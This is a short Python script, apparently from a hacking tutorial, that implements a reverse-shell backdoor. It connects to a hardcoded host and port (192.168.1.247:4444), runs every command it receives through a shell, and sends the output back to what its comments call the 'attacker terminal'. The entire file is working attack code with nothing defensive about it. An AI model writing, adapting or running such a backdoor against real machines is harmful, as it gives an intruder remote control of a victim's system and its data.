#!/usr/bin/env python

import socket
import subprocess


def exe_sys_command(command):
    return subprocess.check_output(command, shell=True)  # executes command. shell=True turns it into a string
    # returns result of executed command


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create socket object

connection.connect(("192.168.1.247", 4444))  # specify IP and Port of the destination for the connection

connection.send("\n[+] Creating connection was successful.\n")

while True:
    command = connection.recv(1024)
    command_result = exe_sys_command(command)  # Adds received data/command to function exe_sys_command which will run
    connection.send(command_result)  # sends command results to attacker terminal

connection.close()
